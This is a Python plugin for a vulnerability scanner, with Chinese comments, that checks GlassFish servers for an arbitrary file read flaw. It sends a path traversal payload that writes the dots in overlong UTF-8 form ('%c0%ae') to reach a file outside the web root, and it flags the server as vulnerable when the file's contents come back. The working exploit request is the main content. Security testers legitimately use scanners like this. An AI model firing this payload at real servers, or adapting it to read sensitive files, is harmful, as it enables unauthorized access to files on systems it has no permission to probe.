#!/usr/bin/env python3
# encoding=utf-8
#codeby     道长且阻
#email      @ydhcui/QQ664284092

from core.plugin import BaseWebPlugin,BaseHostPlugin,brute
import requests

class GlassFishReadFile(BaseWebPlugin):
    bugname = "glassfish 任意文件读取漏洞"
    bugrank = "高危"
    bugdesc = """java 中会把 "%c0%ae" 解析为 "\uC0AE" ，最后转义为 ASCCII 字符的 "." （点）。读取任意文件。"""
    bugnote = "http://www.wooyun.org/bugs/wooyun-2010-0144595"

    def filter(self, web):
        return 'glassfish' in web.content or 'JAVA' in web.xpoweredby

    def verify(self,web,user='',pwd='',timeout=10):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF"
        vulnurl = web.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if "Version" in req.text:
                self.bugaddr = vulnurl
                self.bugres = req.text
                return True
        except Exception as e:
            print(e)